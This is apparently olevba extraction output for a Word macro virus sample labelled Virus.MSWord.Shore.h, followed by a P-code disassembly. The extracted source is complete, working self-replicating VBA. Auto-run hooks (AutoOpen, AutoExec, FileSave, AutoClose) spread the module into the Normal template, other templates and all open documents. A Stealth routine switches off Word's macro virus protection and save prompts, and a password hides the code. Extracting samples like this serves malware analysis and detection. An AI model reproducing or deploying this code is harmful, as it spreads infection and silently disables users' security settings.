olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shore.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shore.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BLUE.bas 
in file: Virus.MSWord.Shore.h - OLE stream: 'Macros/VBA/BLUE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Public declaration
'
'
Public Const SeriesNumber = 29091979
Public Const ModuleName = "BLUE", mw = "Microsoft Word", _
        YOS = "Wild Yudha Blue", _
        Peace = "Rosa", _
        SerNum$ = "Series Number", _
        pass = "Password : ", _
        badboy = "Wanna be a bad boy....", _
        scrollCap = "Normal." & ModuleName & ".scrollCaption"

Public Const msg = "Dont even try to change my macro", _
        aaa = "§·_n˛__", bbb = "tasya", ccc = "justgoaway", _
        abadacc = "Bad access...", _
        code = "Anastasya", ddd = "noromance", eee = "Yudha"

Public anCap As String, anInt As Single, anPos As Integer, Animated As Boolean, _
        ToolsOptionsDlg As Dialog, _
        OrganizerDlg As Dialog, _
        ToolsTemplatesDlg As Dialog, _
        ToolsMacrosDlg As Dialog, _
        FormatStyleDlg As Dialog

'procedures in BLUE module
Sub Buggy()
Dim aDocProp As DocumentProperty
    For Each aDocProp In NormalTemplate.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
    
    NormalTemplate.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False
End Sub


Function getDocPropExist(theObject As Object) As Boolean
Dim adp As DocumentProperty
    getDocPropExist = False
    For Each adp In theObject.CustomDocumentProperties
    With adp
        If .Name = SerNum$ And .Type = msoPropertyTypeNumber And _
            .Value = SeriesNumber Then
            getDocPropExist = True
            Exit Function
        End If
    End With
    Next adp
End Function

Function getModuleExist(theObject As Object) As Boolean
Dim aDocProp As DocumentProperty
    getModuleExist = False
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name = ModuleName Then
            getModuleExist = True
            Exit Function
        End If
    Next anObject
End Function
    
Function getInfected(theObject As Object) As Boolean
    getInfected = getModuleExist(theObject) And getDocPropExist(theObject)
End Function

Sub clearMacros(theObject As Object)
Dim aDocProp As DocumentProperty
    For Each anObject In theObject.VBProject.VBComponents
        If anObject.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=theObject.FullName, _
            Name:=anObject.Name, Object:=wdOrganizerObjectProjectItems
        Else
            On Error Resume Next
            With anObject.codemodule
                .deletelines 1, .countoflines
            End With
        End If
    Next anObject
    
    For Each aDocProp In theObject.CustomDocumentProperties
        aDocProp.Delete
    Next aDocProp
End Sub

Sub copyMacros(theSource As Object, theDestination As Object)
Dim aDocProp As DocumentProperty
    If Not getDocPropExist(theDestination) Then _
        theDestination.CustomDocumentProperties.Add _
            Name:=SerNum$, _
            Type:=msoPropertyTypeNumber, _
            Value:=SeriesNumber, _
            LinkToContent:=False

    On Error Resume Next
        Application.OrganizerCopy _
            Source:=theSource.FullName, _
            Destination:=theDestination.FullName, _
            Name:=ModuleName, _
            Object:=wdOrganizerObjectProjectItems
End Sub

Sub Infecting(theSource As Object, theDestination As Object)
    On Error Resume Next
    If Not getInfected(theDestination) Then
        Application.OrganizerRename _
            Source:=theDestination.FullName, _
            Name:=ModuleName, newname:="xxxx", _
            Object:=wdOrganizerObjectProjectItems
        clearMacros theDestination
        copyMacros theSource, theDestination
        On Error Resume Next
        theDestination.Save True
    End If
End Sub

Sub Copy2Normal()
Dim ATemp As Template
    Stealth
    If Documents.Count > 0 Then
        Infecting ActiveDocument, NormalTemplate
        If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
            Infecting ActiveDocument, ActiveDocument.AttachedTemplate
        For Each ATemp In Templates
            Infecting ActiveDocument, ATemp
        Next ATemp
    End If
    
    With NormalTemplate.VBProject.VBComponents(1).codemodule
        .deletelines 1, .countoflines
    End With
End Sub

Sub Copy2Document()
Dim Adoc As Document
    Stealth
    For Each Adoc In Documents
        Infecting NormalTemplate, Adoc
        On Error Resume Next
        WordBasic.viewpage
    Next Adoc
    If Documents.Count > 0 Then _
    If ActiveDocument.AttachedTemplate <> NormalTemplate Then _
        Infecting NormalTemplate, ActiveDocument.AttachedTemplate
End Sub

Sub Jump2Normal(macName As String)
    Application.Run "normal." & ModuleName & "." & macName
End Sub

'infection procedures
Sub AutoOpen()
    Stealth
    WordBasic.DisableAutoMacros True
    
    If getModuleExist(NormalTemplate) Then
        Jump2Normal ("Copy2Document")
        If Documents.Count > 0 Then
            On Error Resume Next
            ActiveDocument.Save
        End If
    Else
        Copy2Normal
        On Error Resume Next
        NormalTemplate.Save
    End If
End Sub

Sub FileOpen()
    Stealth
    WordBasic.DisableAutoMacros True
    AnimateCaption
    
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        AutoOpen
        On Error Resume Next
        ActiveDocument.Saved = True
        ActiveDocument.Save
    End If
    WordBasic.DisableAutoMacros False
End Sub

Sub AutoClose()
    AnimateCaption
    Stealth
    On Error Resume Next
'    AutoOpen
    Copy2Document
    If Not ActiveDocument.Saved And ActiveDocument.Characters.Count > 0 Then ActiveDocument.Save
    ActiveDocument.Saved = True
    ModifyAttr ActiveDocument.FullName
End Sub

Sub FileClose()
Dim afn As String
    AnimateCaption
    WordBasic.DisableAutoMacros True
    On Error Resume Next
    AutoClose
    afn = ActiveDocument.FullName
    ActiveDocument.Close
    ModifyAttr afn
    WordBasic.DisableAutoMacros False
End Sub

Sub FileSave()
    AnimateCaption
    WordBasic.DisableAutoMacros True
    
    Copy2Document
    On Error Resume Next
    With ActiveDocument
        .Save
        .Saved = True
    End With
    WordBasic.DisableAutoMacros False
End Sub



Sub InitDialog()
    Stealth
    Application.DisplayAlerts = wdAlertsNone
    On Error Resume Next
    Set ToolsOptionsDlg = Dialogs(wdDialogToolsOptions)
    Set OrganizerDlg = Dialogs(wdDialogOrganizer)
    Set ToolsTemplatesDlg = Dialogs(wdDialogToolsTemplates)
    Set ToolsMacrosDlg = Dialogs(wdDialogToolsMacro)
    Set FormatStyleDlg = Dialogs(wdDialogFormatStyle)
End Sub
    
    
Sub AutoExec()
Dim Combar As CommandBar
    WordBasic.DisableAutoMacros True
    InitDialog
    Animated = False
    AnimateCaption
    Copy2Normal
    If getInfected(NormalTemplate) Then Copy2Document
    ModifyAttr NormalTemplate.FullName
    Buggy
    For Each Combar In Application.CommandBars
     
     
    Next Combar
End Sub

Sub AutoExit()
    AutoOpen
    AnimateCaption
    ModifyAttr NormalTemplate.FullName
End Sub

Sub fileNewDefault()
    AnimateCaption
    WordBasic.fileNewDefault
    Copy2Document
End Sub

Sub FileNew()
    If Dialogs(wdDialogFileNew).Show <> 0 Then
        AnimateCaption
        Copy2Document
    End If
End Sub

Sub Stealth()
    With Options
        .SaveNormalPrompt = False
        .SavePropertiesPrompt = False
        .VirusProtection = False
    End With
End Sub

Sub NoStealth()
    With Options
        .SaveNormalPrompt = True
        .SavePropertiesPrompt = True
        .VirusProtection = True
    End With
End Sub

Sub ToolsOptions()
    InitDialog
    NoStealth
    On Error Resume Next
    ToolsOptionsDlg.Display
    AnimateCaption
    Stealth
End Sub


Sub NoAccess()
    a = MsgBox(msg, vbExclamation, abadacc)
    AnimateCaption
End Sub

Function passDialog() As Boolean
Dim cruel As String
    passDialog = False
cruel = Mid(code, 6, 1) + Mid(ddd, 3, 1) + Mid(ddd, 3, 2) + Mid(ccc, 5, 1) + Mid(ddd, 6, 2) + Mid(code, 5, 1)
        If LCase(InputBox(pass, badboy)) = cruel Then
        passDialog = True
    Else
        NoAccess
    End If
End Function


Sub ToolsMacro()
    InitDialog
    ToolsMacrosDlg.Display
    AnimateCaption
End Sub


Sub FileTemplates()
    InitDialog
    ToolsTemplatesDlg.Display
'    CustomizationContext = NormalTemplate
    AnimateCaption
End Sub

Sub viewvbcode()
    Application.ShowVisualBasicEditor = passDialog
End Sub

Sub viewcode()
    viewvbcode
End Sub

Sub Organizer()
    InitDialog
    OrganizerDlg.Display
    AnimateCaption
End Sub

Sub FormatStyle()
    InitDialog
    With FormatStyleDlg
        .Display
        .Execute
    End With
    AnimateCaption
End Sub


Sub ModifyAttr(fileName As String)
    On Error Resume Next
    If GetAttr(fileName) <> vbArchive Then SetAttr fileName, vbArchive
End Sub

Sub AnimateCaption()
    On Error Resume Next
    If Documents.Count > 0 Then WordBasic.viewpage
    If Animated Then Exit Sub
    anIntv = 0.5
    anPos = 0
    anCap = YOS
    Application.OnTime Now + TimeSerial(0, 0, 3), scrollCap
    Animated = True
End Sub


Sub ScrollCaption()
    If Animated Then
        Application.Caption = Right$(anCap, anPos)
        Application.OnTime Now + TimeSerial(0, 0, anIntv), scrollCap
        anPos = anPos + 1
    End If
    
    If anPos > Len(anCap) Then
        On Error Resume Next
        WordBasic.viewpage
        
        anPos = 0
        If anCap = YOS Then
            anCap = Peace
            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
            Animated = True
        ElseIf anCap = Peace Then
            anCap = mw
            Application.OnTime Now + TimeSerial(0, 0, 5), scrollCap
            Animated = True
        ElseIf anCap = mw Then
            anCap = YOS
            Application.OnTime Now + TimeSerial(0, 0, 1200), scrollCap
            Animated = False
        End If
    End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Shore.h
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/BLUE - 17290 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0012 "Public declaration"
' Line #1:
' 	QuoteRem 0x0000 0x0000 ""
' Line #2:
' 	QuoteRem 0x0000 0x0000 ""
' Line #3:
' 	Dim (Public Const) 
' 	LitDI4 0xE88B 0x01BB 
' 	VarDefn SeriesNumber
' Line #4:
' 	LineCont 0x0018 0A 00 08 00 0E 00 08 00 12 00 08 00 16 00 08 00 1A 00 08 00 1E 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x0004 "BLUE"
' 	VarDefn ModuleName
' 	LitStr 0x000E "Microsoft Word"
' 	VarDefn mw
' 	LitStr 0x000F "Wild Yudha Blue"
' 	VarDefn YOS
' 	LitStr 0x0004 "Rosa"
' 	VarDefn Peace
' 	LitStr 0x000D "Series Number"
' 	VarDefn SerNum
' 	LitStr 0x000B "Password : "
' 	VarDefn pass
' 	LitStr 0x0016 "Wanna be a bad boy...."
' 	VarDefn badboy
' 	LitStr 0x0007 "Normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x000E ".scrollCaption"
' 	Concat 
' 	VarDefn scrollCap
' Line #5:
' Line #6:
' 	LineCont 0x000C 06 00 08 00 12 00 08 00 16 00 08 00
' 	Dim (Public Const) 
' 	LitStr 0x0020 "Dont even try to change my macro"
' 	VarDefn msg
' 	LitStr 0x0007 "§·_n˛__"
' 	VarDefn aaa
' 	LitStr 0x0005 "tasya"
' 	VarDefn bbb
' 	LitStr 0x000A "justgoaway"
' 	VarDefn ccc
' 	LitStr 0x000D "Bad access..."
' 	VarDefn abadacc
' 	LitStr 0x0009 "Anastasya"
' 	VarDefn code
' 	LitStr 0x0009 "noromance"
' 	VarDefn ddd
' 	LitStr 0x0005 "Yudha"
' 	VarDefn eee
' Line #7:
' Line #8:
' 	LineCont 0x0014 11 00 08 00 15 00 08 00 19 00 08 00 1D 00 08 00 21 00 08 00
' 	Dim (Public) 
' 	VarDefn anCap (As String)
' 	VarDefn anInt (As Single)
' 	VarDefn anPos (As Integer)
' 	VarDefn Animated (As Boolean)
' 	VarDefn ToolsOptionsDlg
' 	VarDefn OrganizerDlg
' 	VarDefn ToolsTemplatesDlg
' 	VarDefn ToolsMacrosDlg
' 	VarDefn FormatStyleDlg
' Line #9:
' Line #10:
' 	QuoteRem 0x0000 0x0019 "procedures in BLUE module"
' Line #11:
' 	FuncDefn (Sub Buggy())
' Line #12:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #13:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #14:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #15:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #16:
' Line #17:
' 	LineCont 0x0010 05 00 0C 00 09 00 0C 00 0D 00 0C 00 11 00 0C 00
' 	Ld SerNum$ 
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	Ld SeriesNumber 
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld NormalTemplate 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #18:
' 	EndSub 
' Line #19:
' Line #20:
' Line #21:
' 	FuncDefn (Function getDocPropExist(theObject As Object) As Boolean)
' Line #22:
' 	Dim 
' 	VarDefn adp (As DocumentProperty)
' Line #23:
' 	LitVarSpecial (False)
' 	St getDocPropExist 
' Line #24:
' 	StartForVariable 
' 	Ld adp 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #25:
' 	StartWithExpr 
' 	Ld adp 
' 	With 
' Line #26:
' 	LineCont 0x0004 0B 00 0C 00
' 	MemLdWith New 
' 	Ld SerNum$ 
' 	Eq 
' 	MemLdWith TypeOf 
' 	Ld msoPropertyTypeNumber 
' 	Eq 
' 	And 
' 	MemLdWith Value 
' 	Ld SeriesNumber 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #27:
' 	LitVarSpecial (True)
' 	St getDocPropExist 
' Line #28:
' 	ExitFunc 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	EndWith 
' Line #31:
' 	StartForVariable 
' 	Ld adp 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	EndFunc 
' Line #33:
' Line #34:
' 	FuncDefn (Function getModuleExist(theObject As Object) As Boolean)
' Line #35:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #36:
' 	LitVarSpecial (False)
' 	St getModuleExist 
' Line #37:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #38:
' 	Ld anObject 
' 	MemLd New 
' 	Ld ModuleName 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitVarSpecial (True)
' 	St getModuleExist 
' Line #40:
' 	ExitFunc 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	EndFunc 
' Line #44:
' Line #45:
' 	FuncDefn (Function getInfected(theObject As Object) As Boolean)
' Line #46:
' 	Ld theObject 
' 	ArgsLd getModuleExist 0x0001 
' 	Ld theObject 
' 	ArgsLd getDocPropExist 0x0001 
' 	And 
' 	St getInfected 
' Line #47:
' 	EndFunc 
' Line #48:
' Line #49:
' 	FuncDefn (Sub clearMacros(theObject As Object))
' Line #50:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #51:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #52:
' 	Ld anObject 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #53:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld theObject 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld anObject 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' 	StartWithExpr 
' 	Ld anObject 
' 	MemLd codemodule 
' 	With 
' Line #57:
' 	LitDI2 0x0001 
' 	MemLdWith countoflines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #58:
' 	EndWith 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	StartForVariable 
' 	Ld anObject 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' Line #62:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	Ld theObject 
' 	MemLd CustomDocumentProperties 
' 	ForEach 
' Line #63:
' 	Ld aDocProp 
' 	ArgsMemCall Delete 0x0000 
' Line #64:
' 	StartForVariable 
' 	Ld aDocProp 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' 	EndSub 
' Line #66:
' Line #67:
' 	FuncDefn (Sub copyMacros(theSource As Object, theDestination As Object))
' Line #68:
' 	Dim 
' 	VarDefn aDocProp (As DocumentProperty)
' Line #69:
' 	LineCont 0x0014 07 00 08 00 0C 00 0C 00 10 00 0C 00 14 00 0C 00 18 00 0C 00
' 	Ld theDestination 
' 	ArgsLd getDocPropExist 0x0001 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld SerNum$ 
' 	ParamNamed New 
' 	Ld msoPropertyTypeNumber 
' 	ParamNamed TypeOf 
' 	Ld SeriesNumber 
' 	ParamNamed Value 
' 	LitVarSpecial (False)
' 	ParamNamed LinkToContent 
' 	Ld theDestination 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' 	EndIf 
' Line #70:
' Line #71:
' 	OnError (Resume Next) 
' Line #72:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	Ld theSource 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #73:
' 	EndSub 
' Line #74:
' Line #75:
' 	FuncDefn (Sub Infecting(theSource As Object, theDestination As Object))
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	Ld theDestination 
' 	ArgsLd getInfected 0x0001 
' 	Not 
' 	IfBlock 
' Line #78:
' 	LineCont 0x000C 03 00 0C 00 09 00 0C 00 11 00 0C 00
' 	Ld theDestination 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	LitStr 0x0004 "xxxx"
' 	ParamNamed newname 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #79:
' 	Ld theDestination 
' 	ArgsCall clearMacros 0x0001 
' Line #80:
' 	Ld theSource 
' 	Ld theDestination 
' 	ArgsCall copyMacros 0x0002 
' Line #81:
' 	OnError (Resume Next) 
' Line #82:
' 	LitVarSpecial (True)
' 	Ld theDestination 
' 	ArgsMemCall Save 0x0001 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	EndSub 
' Line #85:
' Line #86:
' 	FuncDefn (Sub Copy2Normal())
' Line #87:
' 	Dim 
' 	VarDefn ATemp (As Template)
' Line #88:
' 	ArgsCall Stealth 0x0000 
' Line #89:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #90:
' 	Ld ActiveDocument 
' 	Ld NormalTemplate 
' 	ArgsCall Infecting 0x0002 
' Line #91:
' 	LineCont 0x0004 07 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall Infecting 0x0002 
' 	EndIf 
' Line #92:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #93:
' 	Ld ActiveDocument 
' 	Ld ATemp 
' 	ArgsCall Infecting 0x0002 
' Line #94:
' 	StartForVariable 
' 	Ld ATemp 
' 	EndForVariable 
' 	NextVar 
' Line #95:
' 	EndIfBlock 
' Line #96:
' Line #97:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #98:
' 	LitDI2 0x0001 
' 	MemLdWith countoflines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #99:
' 	EndWith 
' Line #100:
' 	EndSub 
' Line #101:
' Line #102:
' 	FuncDefn (Sub Copy2Document())
' Line #103:
' 	Dim 
' 	VarDefn Adoc (As Document)
' Line #104:
' 	ArgsCall Stealth 0x0000 
' Line #105:
' 	StartForVariable 
' 	Ld Adoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #106:
' 	Ld NormalTemplate 
' 	Ld Adoc 
' 	ArgsCall Infecting 0x0002 
' Line #107:
' 	OnError (Resume Next) 
' Line #108:
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' Line #109:
' 	StartForVariable 
' 	Ld Adoc 
' 	EndForVariable 
' 	NextVar 
' Line #110:
' 	LineCont 0x0008 07 00 04 00 0E 00 08 00
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Ld NormalTemplate 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	ArgsCall Infecting 0x0002 
' 	EndIf 
' 	EndIf 
' Line #111:
' 	EndSub 
' Line #112:
' Line #113:
' 	FuncDefn (Sub Jump2Normal(macName As String))
' Line #114:
' 	LitStr 0x0007 "normal."
' 	Ld ModuleName 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld macName 
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #115:
' 	EndSub 
' Line #116:
' Line #117:
' 	QuoteRem 0x0000 0x0014 "infection procedures"
' Line #118:
' 	FuncDefn (Sub AutoOpen())
' Line #119:
' 	ArgsCall Stealth 0x0000 
' Line #120:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #121:
' Line #122:
' 	Ld NormalTemplate 
' 	ArgsLd getModuleExist 0x0001 
' 	IfBlock 
' Line #123:
' 	LitStr 0x000D "Copy2Document"
' 	Paren 
' 	ArgsCall Jump2Normal 0x0001 
' Line #124:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #125:
' 	OnError (Resume Next) 
' Line #126:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	ElseBlock 
' Line #129:
' 	ArgsCall Copy2Normal 0x0000 
' Line #130:
' 	OnError (Resume Next) 
' Line #131:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	EndSub 
' Line #134:
' Line #135:
' 	FuncDefn (Sub FileOpen())
' Line #136:
' 	ArgsCall Stealth 0x0000 
' Line #137:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #138:
' 	ArgsCall AnimateCaption 0x0000 
' Line #139:
' Line #140:
' 	OnError (Resume Next) 
' Line #141:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #142:
' 	ArgsCall AutoOpen 0x0000 
' Line #143:
' 	OnError (Resume Next) 
' Line #144:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #145:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #148:
' 	EndSub 
' Line #149:
' Line #150:
' 	FuncDefn (Sub AutoClose())
' Line #151:
' 	ArgsCall AnimateCaption 0x0000 
' Line #152:
' 	ArgsCall Stealth 0x0000 
' Line #153:
' 	OnError (Resume Next) 
' Line #154:
' 	QuoteRem 0x0000 0x000C "    AutoOpen"
' Line #155:
' 	ArgsCall Copy2Document 0x0000 
' Line #156:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	Ld ActiveDocument 
' 	MemLd Characters 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #157:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #158:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #159:
' 	EndSub 
' Line #160:
' Line #161:
' 	FuncDefn (Sub FileClose())
' Line #162:
' 	Dim 
' 	VarDefn afn (As String)
' Line #163:
' 	ArgsCall AnimateCaption 0x0000 
' Line #164:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #165:
' 	OnError (Resume Next) 
' Line #166:
' 	ArgsCall AutoClose 0x0000 
' Line #167:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St afn 
' Line #168:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #169:
' 	Ld afn 
' 	ArgsCall ModifyAttr 0x0001 
' Line #170:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #171:
' 	EndSub 
' Line #172:
' Line #173:
' 	FuncDefn (Sub FileSave())
' Line #174:
' 	ArgsCall AnimateCaption 0x0000 
' Line #175:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #176:
' Line #177:
' 	ArgsCall Copy2Document 0x0000 
' Line #178:
' 	OnError (Resume Next) 
' Line #179:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #180:
' 	ArgsMemCallWith Save 0x0000 
' Line #181:
' 	LitVarSpecial (True)
' 	MemStWith Saved 
' Line #182:
' 	EndWith 
' Line #183:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #184:
' 	EndSub 
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' 	FuncDefn (Sub InitDialog())
' Line #189:
' 	ArgsCall Stealth 0x0000 
' Line #190:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #191:
' 	OnError (Resume Next) 
' Line #192:
' 	SetStmt 
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsOptionsDlg 
' Line #193:
' 	SetStmt 
' 	Ld wdDialogOrganizer 
' 	ArgsLd Dialogs 0x0001 
' 	Set OrganizerDlg 
' Line #194:
' 	SetStmt 
' 	Ld wdDialogToolsTemplates 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsTemplatesDlg 
' Line #195:
' 	SetStmt 
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	Set ToolsMacrosDlg 
' Line #196:
' 	SetStmt 
' 	Ld wdDialogFormatStyle 
' 	ArgsLd Dialogs 0x0001 
' 	Set FormatStyleDlg 
' Line #197:
' 	EndSub 
' Line #198:
' Line #199:
' Line #200:
' 	FuncDefn (Sub AutoExec())
' Line #201:
' 	Dim 
' 	VarDefn Combar (As CommandBar)
' Line #202:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #203:
' 	ArgsCall InitDialog 0x0000 
' Line #204:
' 	LitVarSpecial (False)
' 	St Animated 
' Line #205:
' 	ArgsCall AnimateCaption 0x0000 
' Line #206:
' 	ArgsCall Copy2Normal 0x0000 
' Line #207:
' 	Ld NormalTemplate 
' 	ArgsLd getInfected 0x0001 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Copy2Document 0x0000 
' 	EndIf 
' Line #208:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #209:
' 	ArgsCall Buggy 0x0000 
' Line #210:
' 	StartForVariable 
' 	Ld Combar 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ForEach 
' Line #211:
' Line #212:
' Line #213:
' 	StartForVariable 
' 	Ld Combar 
' 	EndForVariable 
' 	NextVar 
' Line #214:
' 	EndSub 
' Line #215:
' Line #216:
' 	FuncDefn (Sub AutoExit())
' Line #217:
' 	ArgsCall AutoOpen 0x0000 
' Line #218:
' 	ArgsCall AnimateCaption 0x0000 
' Line #219:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsCall ModifyAttr 0x0001 
' Line #220:
' 	EndSub 
' Line #221:
' Line #222:
